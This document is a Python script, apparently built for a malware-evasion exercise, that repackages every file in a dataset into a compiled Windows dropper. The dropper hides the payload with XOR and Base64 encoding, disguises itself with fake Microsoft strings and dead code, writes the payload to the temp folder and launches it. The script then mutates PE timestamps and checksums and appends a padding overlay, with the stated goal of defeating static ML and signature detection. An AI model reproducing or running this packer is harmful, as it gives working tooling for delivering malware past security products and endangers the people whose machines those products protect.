#!/usr/bin/env python3
"""
Method A - Combined Dropper + Metadata Mutation + Overlay

Combines:
1. Dropper: XOR-encrypted + Base64-encoded payload in C++ stub
2. Metadata: TimeDateStamp randomization + CheckSum=0
3. Overlay: ~1MB low-entropy benign overlay

Evasion rationale:
- Output binary appears like compiler-generated EXE
- Static ML detection reduced due to transformed byte layout
- Timestamp alteration breaks signature heuristics
- Overlay shifts byte distributions & entropy profiles
"""

import argparse
import base64
import csv
import hashlib
import random
import shutil
import subprocess
import tempfile
import time
import zipfile
from pathlib import Path


METHOD_NAME = "methodA_dropper_metadata_overlay"
DEFAULT_ARCHIVE = Path(__file__).resolve().parents[1] / "to_be_evaded_ds.zip"
DEFAULT_WORK_ROOT = Path(__file__).resolve().parent / "artifacts" / METHOD_NAME
DEFAULT_OUTPUT_ZIP = Path(__file__).resolve().parent / f"{METHOD_NAME}_outputs.zip"


def extract_dataset(archive_path: Path, destination: Path) -> None:
    if not archive_path.exists():
        raise FileNotFoundError(f"input archive not found: {archive_path}")
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall(destination)


def compress_outputs(source_dir: Path, archive_path: Path) -> None:
    archive_path.parent.mkdir(parents=True, exist_ok=True)
    if archive_path.exists():
        archive_path.unlink()
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))


def collect_inputs(input_root: Path):
    return sorted(
        p
        for p in input_root.rglob("*")
        if p.is_file() and p.name != "sha256sums.txt"
    )


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def apply_metadata_mutation(pe_path: Path) -> bool:
    """Apply metadata mutation: TimeDateStamp + CheckSum"""
    try:
        import pefile
        pe = pefile.PE(str(pe_path))
        
        # Randomize TimeDateStamp (2024-2025 range)
        # 0x65000000 = ~2024-01-01, 0x66000000 = ~2025-12-31
        pe.FILE_HEADER.TimeDateStamp = random.randint(0x65000000, 0x66000000)
        
        # Force CheckSum to 0 (Windows ignores this)
        pe.OPTIONAL_HEADER.CheckSum = 0
        
        pe.write(str(pe_path))
        pe.close()
        return True
    except ImportError:
        return False
    except Exception:
        return False


def add_low_entropy_overlay(file_path: Path, overlay_size: int = 1_000_000) -> None:
    """Add ~1MB low-entropy benign overlay"""
    data = file_path.read_bytes()
    
    # Low-entropy patterns (repetitive, benign)
    benign_patterns = [
        b"Microsoft Corporation\x00" * 100,
        b"Windows Operating System\x00" * 100,
        b"Copyright (C) 2024 Microsoft Corporation. All rights reserved.\x00" * 50,
        b"Visual Studio 2022\x00" * 100,
        b"\x00" * 10000,  # Null padding
        b"kernel32.dll\x00" * 200,
        b"user32.dll\x00" * 200,
        b"advapi32.dll\x00" * 200,
    ]
    
    overlay = bytearray()
    while len(overlay) < overlay_size:
        overlay.extend(random.choice(benign_patterns))
    
    final_data = data + bytes(overlay[:overlay_size])
    file_path.write_bytes(final_data)


def combined_transform(src: Path, dst: Path) -> None:
    """
    Combined transformation:
    1. Create dropper with XOR+Base64 payload
    2. Apply metadata mutation (if PE file)
    3. Add low-entropy overlay
    """
    data = src.read_bytes()
    filename = src.name
    print(f"    -> Combined transform for {filename} ({len(data):,} bytes)")

    # Step 1: XOR + Base64 encryption
    key = random.randint(1, 255)
    encrypted = bytes(b ^ key for b in data)
    b64 = base64.b64encode(encrypted).decode()
    chunks = [b64[i : i + 10000] for i in range(0, len(b64), 10000)]
    b64_array = '"\n        "'.join(chunks)

    # Step 2: C++ dropper stub with benign features
    code = f'''#include <windows.h>
#include <string.h>
// Benign features
const char* g_company = "Microsoft Corporation";
const char* g_product = "Windows System Component";
const char* g_version = "10.0.19041.1";

// Dead code paths (never executed)
void unused_registry_lookup() {{
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion", 0, KEY_READ, &hKey);
    if (hKey) RegCloseKey(hKey);
}}

void unused_version_check() {{
    OSVERSIONINFOA vi = {{sizeof(OSVERSIONINFOA)}};
    GetVersionExA(&vi);
    SYSTEM_INFO si;
    GetSystemInfo(&si);
}}

// Base64 decode
static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
unsigned char* decode_b64(const char* input, size_t* output_len) {{
    size_t n = strlen(input), p = 0, b = 0, bits = 0;
    if (n > 0 && input[n-1]=='=') p++;
    if (n > 1 && input[n-2]=='=') p++;
    size_t ol = (n*3)/4 - p;
    unsigned char* o = (unsigned char*)malloc(ol);
    if (!o) {{ *output_len = 0; return NULL; }}
    size_t j = 0;
    for(size_t x=0; x<n; x++) {{
        char c = input[x]; if(c=='=') break;
        const char* f = strchr(b64, c); if(!f) continue;
        b = (b << 6) | (f - b64); bits += 6;
        if(bits >= 8) {{ bits -= 8; o[j++] = (b >> bits) & 0xFF; }}
    }}
    *output_len = j; return o;
}}

int main() {{
    // Benign initialization (dead code)
    unused_registry_lookup();
    unused_version_check();
    
    // Decode and decrypt payload
    const char* payload =
        "{b64_array}";
    size_t len; 
    unsigned char* bin = decode_b64(payload, &len);
    if (!bin) return 1;
    
    // XOR decrypt
    for(size_t i=0; i<len; i++) bin[i] ^= {key};
    
    // Write to %TEMP% and execute
    char path[MAX_PATH]; 
    GetTempPathA(MAX_PATH, path);
    strcat(path, "\\\\{filename}");
    
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(h != INVALID_HANDLE_VALUE) {{
        DWORD w; 
        WriteFile(h, bin, len, &w, NULL); 
        CloseHandle(h);
        
        STARTUPINFOA si = {{sizeof(si)}}; 
        PROCESS_INFORMATION pi;
        CreateProcessA(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess); 
        CloseHandle(pi.hThread);
    }}
    free(bin); 
    return 0;
}}'''

    with tempfile.TemporaryDirectory() as tmp_dir:
        tmp_path = Path(tmp_dir)
        src_cpp = tmp_path / "d.cpp"
        out_exe = tmp_path / "d.exe"
        src_cpp.write_text(code)

        compiler = "x86_64-w64-mingw32-g++"
        cmd = [
            compiler,
            str(src_cpp),
            "-o",
            str(out_exe),
            "-static",
            "-O3",
            "-s",
            "-fno-exceptions",
            "-fno-rtti",
            "-Wl,--strip-all",
            "-Wl,--no-insert-timestamp",
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
            if result.returncode == 0 and out_exe.exists():
                # Step 3: Apply metadata mutation (if PE)
                apply_metadata_mutation(out_exe)
                
                # Step 4: Add low-entropy overlay (~1MB)
                overlay_size = random.randint(800_000, 1_200_000)
                add_low_entropy_overlay(out_exe, overlay_size)
                
                final_exe = dst.with_suffix(".exe")
                shutil.copy2(out_exe, final_exe)
                size = final_exe.stat().st_size
                print(f"    ✓ Combined transform: {final_exe.name} ({size:,} bytes)")
                return
            error_msg = result.stderr.splitlines()[0] if result.stderr else "unknown error"
            print(f"    MinGW compile failed: {error_msg}")
        except FileNotFoundError:
            print(f"    Compiler {compiler} not found")

    # Fallback: metadata + overlay only
    print("    Fallback: metadata + overlay only")
    dst.write_bytes(data)
    if apply_metadata_mutation(dst):
        print("    ✓ Metadata mutation applied")
    overlay_size = random.randint(800_000, 1_200_000)
    add_low_entropy_overlay(dst, overlay_size)
    print(f"    ✓ Overlay added: {overlay_size:,} bytes")


def process_files(input_dir: Path, output_dir: Path) -> None:
    if output_dir.exists():
        shutil.rmtree(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    files = collect_inputs(input_dir)
    rows = []
    success = 0
    fail = 0

    print(f"Found {len(files)} files")
    for idx, src in enumerate(files, 1):
        print(f"[{idx}/{len(files)}] {src.name}")
        dst = output_dir / src.name
        base_sha = sha256_of(src)
        start = time.time()

        try:
            combined_transform(src, dst)
            duration = time.time() - start
            out_sha = sha256_of(dst)
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": out_sha,
                    "status": "OK",
                    "duration_sec": f"{duration:.3f}",
                    "notes": "dropper+metadata+overlay",
                }
            )
            success += 1
        except Exception as exc:
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": "",
                    "status": "FAIL",
                    "duration_sec": "0.000",
                    "notes": f"error: {str(exc)[:120]}",
                }
            )
            fail += 1

    report_file = output_dir / "compare_report.csv"
    with report_file.open("w", newline="") as handle:
        writer = csv.DictWriter(
            handle,
            fieldnames=[
                "filename",
                "baseline_sha256",
                "output_sha256",
                "status",
                "duration_sec",
                "notes",
            ],
        )
        writer.writeheader()
        writer.writerows(rows)

    sha_file = output_dir / "sha256sums.txt"
    with sha_file.open("w") as handle:
        for row in rows:
            if row["status"] == "OK":
                handle.write(f'{row["output_sha256"]}  {output_dir / row["filename"]}\n')

    print("\nSummary")
    print("-------")
    print(f"Success: {success} | Fail: {fail} | Total: {len(files)}")
    print(f"Outputs:\n - {report_file}\n - {sha_file}")


def run_pipeline(archive_path: Path, work_root: Path, output_zip: Path) -> None:
    input_dir = work_root / "input"
    output_dir = work_root / "output"
    extract_dataset(archive_path, input_dir)
    process_files(input_dir, output_dir)
    compress_outputs(output_dir, output_zip)
    print(f"\nPackaging complete -> {output_zip}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Method A: Combined Dropper + Metadata + Overlay"
    )
    parser.add_argument(
        "--archive",
        default=str(DEFAULT_ARCHIVE),
        help="Path to the zipped dataset",
    )
    parser.add_argument(
        "--work-root",
        default=str(DEFAULT_WORK_ROOT),
        help="Working directory",
    )
    parser.add_argument(
        "--output-zip",
        default=str(DEFAULT_OUTPUT_ZIP),
        help="Output zip file",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    run_pipeline(
        Path(args.archive).expanduser().resolve(),
        Path(args.work_root).expanduser().resolve(),
        Path(args.output_zip).expanduser().resolve(),
    )


if __name__ == "__main__":
    main()

